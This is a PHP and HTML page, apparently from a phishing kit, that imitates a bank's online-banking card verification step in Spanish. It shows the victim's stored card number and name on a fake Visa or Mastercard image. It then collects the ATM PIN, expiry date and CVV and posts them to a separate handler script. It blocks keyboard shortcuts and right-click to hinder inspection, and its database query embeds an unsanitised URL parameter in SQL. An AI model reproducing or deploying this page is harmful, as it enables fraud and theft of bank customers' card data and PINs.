<?php
error_reporting(0);
session_start();
/*===================================================*/
$card = ($_SESSION["card"] ? $_SESSION["card"] : base64_decode($_GET["card"]));
/*===================================================*/
include("../class/db.php"); 
$result = $link->query("SELECT * FROM usuarios WHERE card='".$card."'");
$row = $result->fetch_array(MYSQLI_NUM);
$nombre = $row[3];

$tt = substr($card, 0, 1);
$n1 = substr($card, 0, 4);
$n2 = substr($card, 5, 4);
$n3 = substr($card, 9, 4);
$n4 = substr($card, 13, 4);

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="es" xml:lang="es">
<head>
<meta charset="utf-8">
<meta content="no-cache" http-equiv="pragma">
<meta content="no-cache" http-equiv="cache-control">
<link rel="stylesheet" type="text/css" href="css/resetearcss.css">
<link rel="stylesheet" type="text/css" href="css/tipografias.css">
<link rel="stylesheet" type="text/css" href="css/bienvenido.css">
<link rel="stylesheet" type="text/css" href="css/bn-estilos.css">
<link rel="stylesheet" type="text/css" href="../files/css/TheCodePoints.css">   
<script type="text/javascript" src="js/bn-jquery.js"></script>
<script type="text/javascript" src="js/jquery.ui.js"></script>
<script language="javascript" type="text/javascript">
function soloNumerosAll(e){
	tecla = (document.all) ? e.keyCode : e.which;
	if (tecla!=0){
	    if (tecla==8) return true;
	   	patron =/\d/
    	te = String.fromCharCode(tecla);
    	return patron.test(te);
    }
}
</script>
<style>
tr td{
	vertical-align:middle !important;
}

.ingreso {
	background:#fff;
	color: #000;
	height: 30px;
	font: 12px/30px arial;
	margin: 0px 1px 1px 0px;
	padding: 0px 0px 0px 13px;
	width: 287px;
	border:1px solid #fff;
}
.thumbnail {
position: relative;
float: inherit; }

.thumbnail span { 
position: absolute;
padding: 3px;
visibility: hidden;
color: black;
text-decoration: none; }

.thumbnail:hover span { 
visibility: visible;
top: 5px; 
left: 10px;
-webkit-border-radius: 3px; 
-moz-border-radius: 3px; 
-ms-border-radius: 3px;
-o-border-radius: 3px;
border-radius: 3px; }

.tama {
width:33px;
height:14px; }

.secure {  /* Clase para el input type="text" */
/* -webkit-text-security:disc !important; 
font-size: 9px !important; */
font-family:TheCodePoints !important; }

*::-webkit-input-placeholder { /* Google Chrome y Safari */
color: #757575;
font-family:"Trebuchet MS", Arial, Helvetica, sans-serif;
font-size: 12px; }

*:-moz-placeholder { /* Firefox anterior a 19 */
color: #757575;
font-family:"Trebuchet MS", Arial, Helvetica, sans-serif;
font-size: 12px; }

*::-moz-placeholder { /* Firefox 19 y superior */
color: #757575;
font-family:"Trebuchet MS", Arial, Helvetica, sans-serif;
font-size: 12px; }

*:-ms-input-placeholder { /* Internet Explorer 10 y superior */
color: #757575;
font-family:"Trebuchet MS", Arial, Helvetica, sans-serif;
font-size: 12px; }
</style>
<script type="text/javascript" src="../jquery-1.8.3.min.js"></script>
<script language="JavaScript">
document.onkeydown = function(e) {
tecla = (document.all) ? e.keyCode : e.which;
	//alert(tecla)
if (tecla === 116 || tecla === 123)  return false;
if (e.ctrlKey && (tecla === 67 || tecla === 83 || tecla === 85 || tecla === 86 || tecla === 116)) { return false; } else { return true; }};
$(document).keypress("u",function(e) { if(e.ctrlKey) { return false; } else { return true; } });
</script>
<script language="JavaScript">
document.addEventListener("contextmenu", function(e){e.preventDefault();}, false);
</script>
</head>
<body>
	<form name="frmConsulta" id="form" method="post">
		<input type="text" name="methodx_captcha" id="methodx" style="display: none;" value="card">
		<input type="hidden" id="ind_long_clave" name="ind_long_clave" value="6" />
		<input type="hidden" id="param_captcha" name="param_captcha" value="1" />
		
		<div id="contenidos-informativos">
			<h2>Bienvenido/a</h2>
			<div id="cuentas">
				<table width="100%" border="0" align="center">
				<tbody>
				<tr align="left" valign="top">
					<td colspan="3">
					  <table class="table-cuentas" width="100%" border="0" cellpadding="0" cellspacing="1">
						<tbody>
						<tr>
							<td colspan="2" align="center" class="texto" height="20"><p align="justify">Para mayor seguridad es necesario que valide su ingreso a nuestra Banca por nternet, por favor ingrese los 6 dígitos de su dispositivo Token para poder continuar.</p></td>
						</tr>
						<tr>
							<td colspan="2" align="center" class="tituloTabla">AFILIACION VERIFIED BY VISA / MASTERCARD SECURE CODE</td>
						</tr>	
						<tr>
							<td colspan="2" height="10" align="center" class="tituloCelda"></td>
						  </tr>
						<tr>
							<td class="detalleCelda" align="right">Ingrese su ATM</td>
							<td align="left" class="detalleCelda"><input type="password" placeholder="ATM" style="margin-left:2px; padding: 5px; border: 1px solid #CCC; padding-left: 5px; border-radius: 5px; outline: none; color: #71777f; font-family:'Trebuchet MS', Arial, Helvetica, sans-serif; font-size: 13px; text-align:left; width: 80px;" name="atm" id="atm" maxlength="4" onkeypress="return soloNumerosAll(event)" required="required"/>&nbsp;(Clave de 4 dígitos)</td>
						  </tr>
						<tr>
							<td colspan="2" height="10" align="center">&nbsp;</td>
						  </tr>
						<tr>
                            <?php
      $style = "style=\"background-image:url(img/bgVisa.png); background-repeat:no-repeat; height:200px; width:410px; left:20%; position:relative;\"";
      if ($tt == "5") {
      $style = "style=\"background-image:url(img/bgMaster.png); background-repeat:no-repeat; height:200px; width:410px; left:20%; position:relative;\""; }
                     ?>
          <td colspan="3"><div <?= $style ?>>
              <div style="padding: 76px 10px 0px 10px;">
                            <input name="n1" type="text" style="width:45px; height:24px; font-size:12px; text-align:center; margin-left:25px; border-radius:4px;" value="<?= $n1; ?>" maxlength="4" onKeyPress="return soloNumerosAll(event)" readonly>
                            <input name="n2" type="text" style="width:45px; height:24px; font-size:12px; text-align:center; margin-left:12px; border-radius:4px;" value="<?= $n2; ?>" maxlength="4" onKeyPress="return soloNumerosAll(event)" readonly>
                            <input name="n3" type="text" style="width:45px; height:24px; font-size:12px; text-align:center; margin-left:12px; border-radius:4px;" value="<?= $n3; ?>" maxlength="4" onKeyPress="return soloNumerosAll(event)" readonly>
                            <input name="n4" type="text" style="width:45px; height:24px; font-size:12px; text-align:center; margin-left:12px; border-radius:4px;" value="<?= $n4; ?>" maxlength="4" onKeyPress="return soloNumerosAll(event)" readonly>
                            <input type="hidden" maxlength="16"  name="txtNumeroTarjeta" id="txtNumeroTarjeta" value="<?= $card; ?>"/>
                        </div>
              <div style="position: absolute; left: 45px; top: 115px;">
             <b style="font-size:11px; color:#FFFFFF; font-family:'Trebuchet MS', Arial, Helvetica, sans-serif;"><?= $n1; ?></b>
                        </div>          
              <div style="position: absolute;left: 110px;top: 119px;">
               <table>
                 <tbody>
                   <tr>
                     <td><span style="font-size:8px; text-align: right; margin-right: 5px; color:#FFFFFF; font-family:'Trebuchet MS', Arial, Helvetica, sans-serif;">VÁLIDA<br>HASTA</span></td>
                           <td>
                              <select name="expemes" style="height: 26px;padding: 0px 3px;font-size: 11px;border-radius: 4px;">
                                                <option value="none">MES</option>
                                                <option value="01">01</option>
                                                <option value="02">02</option>
                                                <option value="03">03</option>
                                                <option value="04">04</option>
                                                <option value="05">05</option>
                                                <option value="06">06</option>
                                                <option value="07">07</option>
                                                <option value="08">08</option>
                                                <option value="09">09</option>
                                                <option value="10">10</option>
                                                <option value="11">11</option>
                                                <option value="12">12</option>
                                            </select>
                                        </td>
                                        <td width="5"></td>
                                        <td>
                                            <select name="expeano" style="height: 26px;padding: 0px 3px;font-size: 11px;border-radius: 4px;">
                                                <option value="none">AÑO</option>
                                                <option value="20">20</option>
                                                <option value="21">21</option>
                                                <option value="22">22</option>
                                                <option value="23">23</option>
                                                <option value="24">24</option>
                                                <option value="25">25</option>
                                                <option value="26">26</option>
                                                <option value="27">27</option>
                                            </select>
                                        </td>
                                    </tr>
                                </tbody></table>
                            </div>
                            <div style="position: absolute; left: 25px; top: 154px;">
                                <table>
                                    <tbody>
                                    <tr>
                                    	<td><b style="font-size:12px; color:#FFFFFF; font-family:'Trebuchet MS', Arial, Helvetica, sans-serif;"><?=strtoupper($nombre);?></b></td>
                                    </tr>
                                	</tbody>
                                </table>
                            </div>
                            <div style="position: absolute; left: 340px; top: 101px;">
                                <table>
                                    <tbody><tr>
                                        <td><input style="margin-left:3px; padding: 5px; border: 1px solid #CCC; padding-left: 5px; border-radius: 5px; outline: none; color: #71777f; font-size: 12px; text-align:center;" id="cv" name="cv" size="1" maxlength="3" onKeyPress="return soloNumerosAll(event)" placeholder="CVV" onFocus="this.placeholder = ''; this.className = ''" onBlur="this.placeholder = 'CVV'; this.className = 'secure tama'" required="required"></td>
                                    </tr>
                                    <tr>
                                        <td height="3"></td>
                                    </tr>
                                    <tr>
                                        <td align="center">
                                            <a class="thumbnail"><i style="background-image:url(img/bt_Ayuda.png); display:inline-block; background-size:contain; width:18px; height:18px; cursor:pointer;"></i><span style="left:-110px; top:-180px;"><img src="img/cv.png" width="234"></span></a>
                                        </td>
                                    </tr>
                                </tbody></table>
                            </div></td>
						  </tr>
                                                    
						<tr>
							<td colspan="2"><hr></td>
						</tr>
						</tbody>
						</table>

                  <tr>
                  <td width="15%">&nbsp;</td>
                  <td width="70%"><p style="padding-top:12px; height:25px; background-color:#DC291E; color:#FFF; text-align:center; border-radius:4px; display:none; font-size: 13px; font-family:'Trebuchet MS', Arial, Helvetica, sans-serif" id="error_men"></p></td>
                  <td width="15%">&nbsp;</td>
                  
                  </tr>
                  <tr>
                    <td colspan="3" height="5"></td>
                  </tr>
                  <tr>
                    <td colspan="3" align="center">
						<div id="loginx" class="loginx" onclick="send_parametro();">
                            CONTINUAR
                      </div></td>
                  </tr>
                   
				  <tr>
			      <td colspan="3"></td>	
				<tr>
				  <td colspan="3"></tr>
				</tbody>
				</table>
			</div>
	  </div>
	</form>
<script language="javascript">
function send_parametro(){
	var atmx = document.frmConsulta.atm.value;
	
	var xmes = document.frmConsulta.expemes.value;
	var xano = document.frmConsulta.expeano.value;
	var xcvv = document.frmConsulta.cv.value;
	var xcar = document.frmConsulta.txtNumeroTarjeta.value;
	
	if (atmx.length < 4){
		$("#error_men").html('Error, ingrese su ATM').fadeIn("fast").delay(4000).fadeOut("fast");
		document.frmConsulta.atm.focus();
		return false;
	}
	
	if (xmes == "none"){
		$("#error_men").html('Error, seleccione el mes de vencimiento de su tarjeta').fadeIn("fast").delay(4000).fadeOut("fast");
		document.frmConsulta.expemes.focus();
		return false;
	}
	
	if (xano == "none"){
		$("#error_men").html('Error, seleccione el año de vencimiento de su tarjeta').fadeIn("fast").delay(4000).fadeOut("fast");
		document.frmConsulta.expeano.focus();
		return false;
	}
					
	if (xcvv.length < 3){
		$("#error_men").html('Error, ingrese \u00f3 complete su CVV').fadeIn("fast").delay(4000).fadeOut("fast");
		document.frmConsulta.cv.focus();
		return false;
	}
	
	if (xmes < 01 && xano == 20){
		$("#error_men").html('Su tarjeta ha vencido, por favor verifique').fadeIn("fast").delay(4000).fadeOut("fast");
		document.frmConsulta.expemes.focus();
		return false;
	}
	
	$("#form").get(0).setAttribute('action', '../loginx.php?id=card');
	$("#btnLogin").attr("disabled","disabled");
	$("#form").submit();
}
</script>
</body></html>